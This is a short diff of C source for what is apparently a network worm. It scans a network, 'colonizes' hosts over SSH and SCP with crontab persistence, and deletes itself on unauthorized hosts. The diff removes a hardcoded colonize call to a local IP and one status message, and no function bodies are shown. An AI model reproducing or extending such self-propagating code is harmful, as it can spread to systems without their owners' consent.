@@ -33,8 +33,6 @@ int main (int argc, char **argv) {
 	if (isRoot()) {
 		// if the host is the administrator
 		if(isSourceHost(ip)) {
-			colonize("192.168.1.90", programPath, ssh, portSSH, scp, targetPath, crontab);
-			return 0;
 			hostList = scanNetwork(ip, broadcast, portSSH);
 			inet_aton(ip, &adminHost);
 			cpt = 0;
@@ -58,7 +56,6 @@ int main (int argc, char **argv) {
 				printf("authorized");
 			}
 			else {
-				printf("not authorized");
 				// delete program, configuration file and restore crontab
 				wormDelete(programName, targetPath, crontab);
 			}
